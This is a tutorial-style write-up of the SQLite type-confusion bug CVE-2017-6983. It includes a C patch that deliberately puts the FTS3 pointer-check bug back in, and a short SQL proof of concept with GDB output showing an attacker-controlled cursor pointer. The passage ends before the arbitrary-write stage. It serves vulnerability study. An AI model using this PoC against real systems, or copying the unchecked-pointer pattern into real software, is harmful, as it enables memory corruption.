# CVE-2017-6983

CVE-2017-6983 is a type-confusion bug in SQLite that can provide arbitrary memory-write primitive. More details about this bug and its exploitation can be found via the following links

* Many Birds, One Stone: Exploiting a Single SQLite Vulnerability Across Multiple Software. BlackHat USA 2017.
  * [Video](https://www.youtube.com/watch?v=Kqv8S1BQYwE&ab_channel=BlackHat)
  * [Slides](https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf) (p39-p60)

# Source Code

The following instructions provide a way to obtain the source code of SQLite version 3.40.1.

```bash
$ git clone https://github.com/sqlite/sqlite.git
$ cd sqlite
$ git checkout version-3.40.1 #-> commit 1fdaa9d1a7
```

You may need to compile the source code to produce the file `sqlite3.c` and `shell.c`.

```bash
# (within sqlite folder)
$ CC="clang -DSQLITE_DEBUG" ./configure --enable-debug
$ make
$ ls -l sqlite3.c shell.c
```

# Bring the Bug Back

The version of SQLite we analyze is 3.40.1, which has fixed this bug. For the demonstration purpose, we manually modify the source code to bring the bug back into this version. The following patch shows the changes to bring the bug back. You should never apply this patch to your SQLite source code except for this demo purpose.


```c
// in sqlite3.c

static int fts3FunctionArg(
  sqlite3_context *pContext,      /* SQL function call context */
  const char *zFunc,              /* Function name */
  sqlite3_value *pVal,            /* argv[0] passed to function */
  Fts3Cursor **ppCsr              /* OUT: Store cursor handle here */
){
  int rc;
  /* Insert Vuln */
+ Fts3Cursor *pRet;
+ memcpy(&pRet, sqlite3_value_blob(pVal), sizeof(Fts3Cursor *));
+ *ppCsr = pRet;
- *ppCsr = (Fts3Cursor*)sqlite3_value_pointer(pVal, "fts3cursor");
  if( (*ppCsr)!=0 ){
    rc = SQLITE_OK;
  }else{
    char *zErr = sqlite3_mprintf("illegal first argument to %s", zFunc);
    sqlite3_result_error(pContext, zErr, -1);
    sqlite3_free(zErr);
    rc = SQLITE_ERROR;
  }
  return rc;
}
```

After this modification, you should compile again via `make`.

# Nice Feature: Virtual Table

SQLite is designed to handle SQL tables, which contain a set of rows and each row is represented by a set of columns. This is the original purpose of it. However, to extend the usability of SQLite, it also supports processing data in other types, like files. The benefit is that we can use the same/familiar SQL commands to operate on other data, like searching within documents using SQL query. This amazing feature is achieve via **virtual table**.

As indicated by the name, a virtual table is not a real traditional SQL table, but a handle in SQLite for data in other types. When creating virtual table, we need to specify its underlying SQLite extension that supports this virtual table. For example, FTS3 is an extension to SQLite that support full-text search (FTS). In this case, when we want to `CREATE`, `INSERT` or `SELECT` from a virtual table, the underlying callback functions defined in the related extension is used to achieve the functionality, instead of operating on real SQL tables using SQLite code.

So far so good.

However, when we create a virtual table and insert data into the table, the data will be stored in the virtual table, in the type of `BLOB`. A blob data is raw, which means we do not know it real type. The extension knows its type, because it predefines the types inside its own virtual table. When it writes (via insert) to the blob, it will follow its own data types. When it reads (via select) from the blob, it also follows its definition.

What will happen if we forge a BLOB data and force the extesion to load it? Err ... Simple. The extension trusts the BLOB data and will still follow its own defintion to load the data, even if the data is not created by itself. This means that if in its own definition some data at offset X is a pointer, the extension will read the value at offset X, and treat the result as a pointer ...

So far, too good, for attackers unfortunately.

This is the bug CVE-2017-6983. Let's look into a simple PoC

# PoC0: control a pointer

Here is the first PoC, which will allow attackers to control one pointer.

```sql
create virtual table a using fts3(b);
insert into a values(x'aabbccdd');
select optimize(b) from a;
```

1. We create a virtual table `a` using the underly FTS3 extension. This virtual table only has one column `b` (yes, it also supports columns).

2. We insert one new record into this virtual table. The content is a BLOB data, which is simply `x'aabbccdd'`.

3. We read from the virtual table `a` via `select`, which will return the content of column `b`, which is `0xddccbbaa` (big endian). However, instead of directly printing the content of `b`, we pass it to another function `optimize`.

Run this PoC with SQLite

```bash
# save the poc above to /tmp/exp0
$ ./sqlite < /tmp/exp0
Segmentation fault (core dumped)
```

Check it with GDB

```bash
$ gdb ./sqlite3
(gdb) r < /tmp/exp0
Program received signal SIGSEGV, Segmentation fault.
0x00000000005b3d4a in fts3OptimizeFunc (pContext=0x664e80, nVal=1, apVal=0x664eb0) at sqlite3.c:182454
182454    p = (Fts3Table *)pCursor->base.pVtab;
(gdb) p pCursor
$1 = (Fts3Cursor *) 0xddccbbaa
```

We can see that `pCursor` is exactly what we insert into the virtual table.

Let's check some code around the crashing instruction.

```bash
(gdb) bt
#0  0x00000000005b3d4a in fts3OptimizeFunc (pContext=0x664e80, nVal=1, apVal=0x664eb0) at sqlite3.c:182454
#1  0x00000000004b34ae in sqlite3VdbeExec (p=0x662a20) at sqlite3.c:98127
#2  0x00000000004549ed in sqlite3Step (p=0x662a20) at sqlite3.c:88072
#3  0x000000000044c267 in sqlite3_step (pStmt=0x662a20) at sqlite3.c:88133
#4  0x000000000043e63e in exec_prepared_stmt (pArg=0x7fffffffcf68, pStmt=0x662a20) at shell.c:18074
#5  0x0000000000418677 in shell_exec (pArg=0x7fffffffcf68, zSql=0x64f430 "select optimize(b) from a;", pzErrMsg=0x7fffffffcd50) at shell.c:18390
#6  0x00000000004428ff in runOneSqlLine (p=0x7fffffffcf68, zSql=0x64f430 "select optimize(b) from a;", in=0x7ffff7c1aaa0 <_IO_2_1_stdin_>, startline=4) at shell.c:25400
#7  0x000000000041934d in process_input (p=0x7fffffffcf68) at shell.c:25564
#8  0x000000000040b9df in main (argc=1, argv=0x7fffffffe308) at shell.c:26419
(gdb) l
182449
182450    UNUSED_PARAMETER(nVal);
182451
182452    assert( nVal==1 );
182453    if( fts3FunctionArg(pContext, "optimize", apVal[0], &pCursor) ) return;
182454    p = (Fts3Table *)pCursor->base.pVtab;
182455    assert( p );
182456
182457    rc = sqlite3Fts3Optimize(p);
182458
```

The exectuion crashes at line `182454`. The line above is an invocation to function `fts3FunctionArg`. The source code of this function is given in the previouis section [Bring the Bug Back](#bring-the-bug-back).

Without diving too deep into SQLite code, it is reasonable to guess that function `fts3OpitmizeFunc` is responsible for handling the `optimize` function in our SQL query. Since we pass `b` into `optimize`, the underlying source code will get the value of `b` via `fts3FunctionArg` and use it inside the `fts3OptimizeFunc`.

* In the vulnerable code (after our patching), SQLite merely uses `sqlite3_value_blob` to obtain the data pointer, and uses `memcpy` to extract the pointer from the BLOB data. It only checks whether the content has blob type.

* In the fixed version, SQLite directly uses `sqlite3_value_pointer` to extract a poitner, where it will check whether the content has poitner type.

Anyway, in the buggy version, we (attackers) can easily control a full pointer `pCursor` in function `fts3optimizeFunc`. Starting from this function, we will try to achieve the arbitrary-write primitive.

